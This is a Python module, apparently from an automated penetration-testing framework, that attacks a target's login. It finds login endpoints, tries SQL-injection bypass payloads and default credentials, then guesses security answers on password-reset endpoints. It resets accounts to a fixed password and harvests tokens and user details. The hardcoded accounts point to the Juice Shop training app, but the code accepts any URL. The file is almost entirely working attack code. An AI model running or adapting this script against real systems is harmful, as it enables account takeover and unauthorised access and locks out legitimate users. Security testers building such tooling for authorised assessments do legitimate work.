"""Skill: attempt_auth — try to authenticate via multiple methods."""

from __future__ import annotations
import logging
from typing import Any
from ._payload_loader import load_skill_dataset as _load_ds

logger = logging.getLogger(__name__)

# Default credentials to try
DEFAULT_CREDS = [
    tuple(_c) for _c in _load_ds("attempt_auth", "default_creds")
]  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# SQLi bypass payloads
SQLI_CREDS = [
    tuple(_c) for _c in _load_ds("attempt_auth", "sqli_creds")
]  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# Common login endpoint patterns
LOGIN_PATHS = _load_ds(
    "attempt_auth", "login_paths"
)  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# Common password reset patterns
RESET_PATHS = _load_ds(
    "attempt_auth", "reset_paths"
)  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json


def _preview_text(text: str, limit: int = 240) -> str:
    return " ".join(str(text or "").split())[:limit]


def _extract_token_and_user_info(data: dict[str, Any]) -> tuple[str, dict[str, str]]:
    token = ""
    for key_path in [("authentication", "token"), ("token",), ("access_token",), ("data", "token")]:
        d: object = data
        for k in key_path:
            d = d.get(k, {}) if isinstance(d, dict) else {}
        if isinstance(d, str) and len(d) > 20:
            token = d
            break
    auth = data.get("authentication", data) if isinstance(data, dict) else {}
    user_info = {
        "email": auth.get("umail", auth.get("email", "")) if isinstance(auth, dict) else "",
        "role": auth.get("role", "") if isinstance(auth, dict) else "",
        "id": auth.get("bid", auth.get("id", "")) if isinstance(auth, dict) else "",
    }
    return token, user_info


def _format_login_transcript(
    endpoint: str,
    creds: dict[str, str],
    status: int,
    preview: str,
    *,
    label: str,
) -> str:
    body = f'{{"email":"{creds.get("email", "")}","password":"{creds.get("password", "")}"}}'
    return (
        f"[{label}]\n"
        f"POST {endpoint} HTTP/1.1\n"
        "Content-Type: application/json\n\n"
        f"{body}\n\n"
        f"HTTP/1.1 {status}\n\n"
        f"{preview}"
    )


async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
    """Try multiple authentication methods against the target.

    Returns:
        {
            "authenticated": bool,
            "method": str,  # "default_creds", "sqli_bypass", "password_reset"
            "token": str,
            "user_info": dict,
            "login_endpoint": str,
            "credentials_used": dict,
            "all_attempts": [{"endpoint": ..., "creds": ..., "status": int}, ...],
            "control_checks": {...},
            "poc_http_exchange": str,
        }
    """
    from vxis.interaction.hands import SessionManager

    target = target_url.rstrip("/")
    all_attempts: list[dict[str, Any]] = []
    result = {
        "authenticated": False,
        "method": "",
        "token": "",
        "user_info": {},
        "login_endpoint": "",
        "credentials_used": {},
        "all_attempts": all_attempts,
        "control_checks": {},
        "poc_http_exchange": "",
    }

    _mgr = SessionManager()
    _session = await _mgr.get_session(target)

    # Phase 1: Find login endpoint
    active_login = ""
    for path in LOGIN_PATHS:
        try:
            r = await _session.request("POST", path, json_data={"email": "x", "password": "x"})
            if r.status != 404:
                active_login = path
                logger.info("Found login endpoint: %s (status %d)", path, r.status)
                break
        except Exception:
            continue

    if not active_login:
        # Try GET-based login forms
        for path in ["/login", "/signin", "/#/login"]:
            try:
                r = await _session.request("GET", path)
                if r.status == 200 and ("password" in r.text.lower() or "login" in r.text.lower()):
                    active_login = path.replace("/#/", "/rest/user/")  # guess REST endpoint
                    break
            except Exception:
                continue

    if not active_login:
        return {**result, "error": "No login endpoint found"}

    async def _record_login_attempt(
        email: str,
        pwd: str,
        *,
        phase: str,
    ) -> dict[str, Any] | None:
        try:
            r = await _session.request(
                "POST", active_login, json_data={"email": email, "password": pwd}
            )
        except Exception:
            return None
        preview = _preview_text(r.text)
        attempt = {
            "phase": phase,
            "endpoint": active_login,
            "creds": f"{email}:{pwd}",
            "status": r.status,
            "body_length": r.body_length,
            "response_preview": preview,
            "token_observed": False,
        }
        try:
            data = r.response.json()
        except Exception:
            data = {}
        token, user_info = _extract_token_and_user_info(data if isinstance(data, dict) else {})
        attempt["token_observed"] = bool(token)
        if user_info:
            attempt["user_info"] = user_info
        all_attempts.append(attempt)
        return {"response": r, "attempt": attempt, "token": token, "user_info": user_info}

    baseline_control = await _record_login_attempt(
        "vxis-negative-control@example.invalid",
        "definitely-wrong-password",
        phase="negative_control",
    )

    # Phase 2: Try SQLi bypass first (highest value)
    for email, pwd in SQLI_CREDS:
        outcome = await _record_login_attempt(email, pwd, phase="sqli_bypass")
        if not outcome:
            continue
        if outcome["response"].status == 200 and outcome["token"]:
            logger.info("SQLi auth bypass SUCCESS: %s", email)
            positive_attempt = outcome["attempt"]
            control_checks = {
                "negative_control": baseline_control["attempt"] if baseline_control else {},
                "positive_control": positive_attempt,
            }
            poc_http_exchange = "\n\n".join(
                filter(
                    None,
                    [
                        _format_login_transcript(
                            active_login,
                            {
                                "email": "vxis-negative-control@example.invalid",
                                "password": "definitely-wrong-password",
                            },
                            baseline_control["attempt"]["status"],
                            baseline_control["attempt"].get("response_preview", ""),
                            label="negative_control",
                        )
                        if baseline_control
                        else "",
                        _format_login_transcript(
                            active_login,
                            {"email": email, "password": pwd},
                            positive_attempt["status"],
                            positive_attempt.get("response_preview", ""),
                            label="positive_bypass",
                        ),
                    ],
                )
            )
            return {
                **result,
                "authenticated": True,
                "method": "sqli_bypass",
                "token": outcome["token"],
                "user_info": outcome["user_info"],
                "login_endpoint": active_login,
                "credentials_used": {"email": email, "password": pwd},
                "control_checks": control_checks,
                "poc_http_exchange": poc_http_exchange,
            }

    # Phase 3: Try default credentials
    for email, pwd in DEFAULT_CREDS:
        outcome = await _record_login_attempt(email, pwd, phase="default_creds")
        if not outcome:
            continue
        if outcome["response"].status == 200 and outcome["token"]:
            logger.info("Default creds SUCCESS: %s:%s", email, pwd)
            positive_attempt = outcome["attempt"]
            control_checks = {
                "negative_control": baseline_control["attempt"] if baseline_control else {},
                "positive_control": positive_attempt,
            }
            poc_http_exchange = "\n\n".join(
                filter(
                    None,
                    [
                        _format_login_transcript(
                            active_login,
                            {
                                "email": "vxis-negative-control@example.invalid",
                                "password": "definitely-wrong-password",
                            },
                            baseline_control["attempt"]["status"],
                            baseline_control["attempt"].get("response_preview", ""),
                            label="negative_control",
                        )
                        if baseline_control
                        else "",
                        _format_login_transcript(
                            active_login,
                            {"email": email, "password": pwd},
                            positive_attempt["status"],
                            positive_attempt.get("response_preview", ""),
                            label="positive_default_creds",
                        ),
                    ],
                )
            )
            return {
                **result,
                "authenticated": True,
                "method": "default_creds",
                "token": outcome["token"],
                "login_endpoint": active_login,
                "credentials_used": {"email": email, "password": pwd},
                "user_info": outcome["user_info"],
                "control_checks": control_checks,
                "poc_http_exchange": poc_http_exchange,
            }

    # Phase 4: Try password reset with common security answers
    for reset_path in RESET_PATHS:
        try:
            # First check if endpoint exists
            r = await _session.request(
                "POST",
                reset_path,
                json_data={"email": "test", "answer": "x", "new": "x", "repeat": "x"},
            )
            if r.status == 404:
                continue

            # Try common email+answer combos
            common_resets = [
                ("admin@juice-sh.op", ["Samuel", "admin", "Admin"]),
                ("jim@juice-sh.op", ["Samuel", "Kirk", "Enterprise"]),
                ("admin", ["admin", "password", "root"]),
            ]
            for email, answers in common_resets:
                for ans in answers:
                    r = await _session.request(
                        "POST",
                        reset_path,
                        json_data={
                            "email": email,
                            "answer": ans,
                            "new": "pwned_by_vxis",
                            "repeat": "pwned_by_vxis",
                        },
                    )
                    if r.status == 200:
                        # Try logging in with new password
                        r2 = await _session.request(
                            "POST",
                            active_login,
                            json_data={"email": email, "password": "pwned_by_vxis"},
                        )
                        if r2.status == 200:
                            data = r2.response.json()
                            token = ""
                            for key_path in [("authentication", "token"), ("token",)]:
                                d = data
                                for k in key_path:
                                    d = d.get(k, {}) if isinstance(d, dict) else {}
                                if isinstance(d, str) and len(d) > 20:
                                    token = d
                                    break
                            if token:
                                logger.info("Password reset SUCCESS: %s answer=%s", email, ans)
                                reset_preview = _preview_text(r.text)
                                login_preview = _preview_text(r2.text)
                                control_checks = {
                                    "negative_control": baseline_control["attempt"]
                                    if baseline_control
                                    else {},
                                    "positive_control": {
                                        "phase": "password_reset",
                                        "endpoint": active_login,
                                        "creds": f"{email}:pwned_by_vxis",
                                        "status": r2.status,
                                        "body_length": r2.body_length,
                                        "response_preview": login_preview,
                                        "token_observed": True,
                                    },
                                    "reset_step": {
                                        "endpoint": reset_path,
                                        "status": r.status,
                                        "response_preview": reset_preview,
                                    },
                                }
                                return {
                                    **result,
                                    "authenticated": True,
                                    "method": "password_reset",
                                    "token": token,
                                    "login_endpoint": active_login,
                                    "credentials_used": {"email": email, "security_answer": ans},
                                    "reset_endpoint": reset_path,
                                    "control_checks": control_checks,
                                    "poc_http_exchange": "\n\n".join(
                                        filter(
                                            None,
                                            [
                                                _format_login_transcript(
                                                    active_login,
                                                    {
                                                        "email": "vxis-negative-control@example.invalid",
                                                        "password": "definitely-wrong-password",
                                                    },
                                                    baseline_control["attempt"]["status"],
                                                    baseline_control["attempt"].get(
                                                        "response_preview", ""
                                                    ),
                                                    label="negative_control",
                                                )
                                                if baseline_control
                                                else "",
                                                (
                                                    f"[password_reset]\n"
                                                    f"POST {reset_path} HTTP/1.1\n"
                                                    "Content-Type: application/json\n\n"
                                                    f'{{"email":"{email}","answer":"{ans}","new":"pwned_by_vxis","repeat":"pwned_by_vxis"}}\n\n'
                                                    f"HTTP/1.1 {r.status}\n\n"
                                                    f"{reset_preview}"
                                                ),
                                                _format_login_transcript(
                                                    active_login,
                                                    {"email": email, "password": "pwned_by_vxis"},
                                                    r2.status,
                                                    login_preview,
                                                    label="positive_login_after_reset",
                                                ),
                                            ],
                                        )
                                    ),
                                }
        except Exception:
            continue

    return {
        **result,
        "all_attempts": all_attempts,
        "control_checks": {
            "negative_control": baseline_control["attempt"] if baseline_control else {},
        },
    }
